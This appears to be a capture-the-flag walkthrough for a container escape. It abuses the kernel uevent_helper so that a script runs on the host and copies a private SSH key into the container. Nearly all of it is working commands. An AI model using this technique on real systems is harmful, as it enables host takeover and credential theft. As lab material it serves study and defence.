1) Gets overlay filesystem path aka path appearing to host to / within container. Echo it to use for step 2.
  ~$ sudo su root
  ~# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
  ~# echo $host_path

2) Two line script: first to trigger shell and second to cat out the target file on the host into output.txt in / within the container. The path may different from people to people.
  ~# nano /trigger.sh
  > #!/bin/sh
  > cat /home/jailer/.ssh/jail.key.priv > (value in $host_path)/output.txt

3) Make the script executable.
  ~# chmod +x /trigger.sh

4) Point to the script and then trigger the script and Notification on release.
  ~# echo "$host_path/trigger.sh" > /sys/kernel/uevent_helper
  ~# echo change > /sys/class/mem/null/uevent

5) Cat out the output file to get the flag.
  ~# cat output.txt
